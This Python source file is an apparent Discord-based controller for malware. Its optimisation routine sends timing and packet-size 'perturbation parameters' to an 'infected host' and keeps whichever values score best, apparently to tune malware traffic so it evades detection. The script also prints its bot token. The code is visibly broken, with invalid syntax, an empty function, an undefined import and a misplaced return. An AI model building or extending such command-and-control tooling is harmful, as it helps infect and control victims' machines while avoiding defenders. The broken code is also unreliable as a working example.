import discord, asyncio, aiohttp, json, time, jsonpickle, sys
from concurrent.futures import ProcessPoolExecutor, Future
from collections import deque
from queue import Queue
from random import randint
from scipy.optimize import OptimizeResult

TOKEN = "" # Get at discordapp.com/developers/applications/me

with open("tokenfile", "r") as f:
    TOKEN = f.readline().strip("\n")
    print(TOKEN)

class Controller:

    def queueDict = {
        "NetworkFlowDurations" : [],
        "PacketSizes" : [],
        "CommandDelays" : [],
        "HeartbeatDelays" : [],
        "OfflineDurations" : [],
    }

    def __init__(self):

        self.client = discord.Client()
        self.setup()

    def setup(self):

        @self.client.event
        @asyncio.coroutine
        async def on_ready():
            print('Logged in as')
            print(self.client.user.name + "\n" + self.client.user.id + "\n--------")



        @self.client.event
        @asyncio.coroutine
        async def on_message(message):
            channel = message.channel
            if message.startswith("MoreParams")
                await self.generate_parameter_queues(channel)
            print(channel.name, channel.id)
            await get_messages(channel)
            #await self.client.send_message(channel, "GIT REKT SCRUB!! Channel name, channel id: " + channel.name + "   " + channel.id

        async def generate_parameter_queues(self, channel):



        self.run()

    def get_all_messages(self, channel):
        logs = yield from self.client.logs_from(channel, limit=10000)
        print(logs)
        for message in logs:
            print(message.content)

    def optimize_perturbation(self, function, pert_array, args=(), maxfev=none, stepsize_prc=0.05, maxiter=40, callback=None, **options):

        """
        Function that optimizes perturbation parameters by looking at all neighbough at a stepsize_prc% distance of the current parameter.

        args:
            function: the function that transmits the perturbation parameters along with a command to the infected host and waits for the response.
            pert_array: the list containing the 3 initial parameters that should be used by the malware.
            args: arguments passed to function
            maxfev:
            stepsize_prc: percentage perturbation on each parameter
            maxiter: maximum amount of iterations
            callback: callback function to run after a test has been performed

        returns:
            instance of OptimizeResult. 
        """
        bestx = pert_array
        besty = function(pert_array)
        funcalls = 1
        niter = 0
        improved = True
        stop = False

        #our looping conditions..
        while improved and not stop and niter < maxiter:
            improved = False
            niter += 1
            #Loop through dimensions; in our case only three
            for dim in range(np.size(pert_array)):
                #This loop perturbs the parameters, and tests them using the argument function - which in our case will be located on the malware
                for s in [bestx[dim] * (1-stepsize_prc), bestx[dim] * (1 + stepsize_prc)]:
                    testx = np.copy(bestx)
                    testx[dim] = s
                    testy = function(testx, *args)
                    funcalls += 1
                    # Need to get a score feedback from the host. Could return the packet size if successful, 0 if not? Or maybe a normalized packet size?
                    if testy > besty:
                        besty = testy
                        bestx = testx
                        improved = True

                    if callback is not None:
                        callback(bestx)
                    if maxfev is not None and funcalls >= maxfev:
                        stop = True
                        break
            return OptimizeResult(fun=besty, x=bestx, nit=niter, nfev=funcalls, success=(niter > 39))

    def run(self):

        try:
            self.client.run(TOKEN)
        except Exception:
            pass





if __name__ == '__main__':
    myobj = Controller()
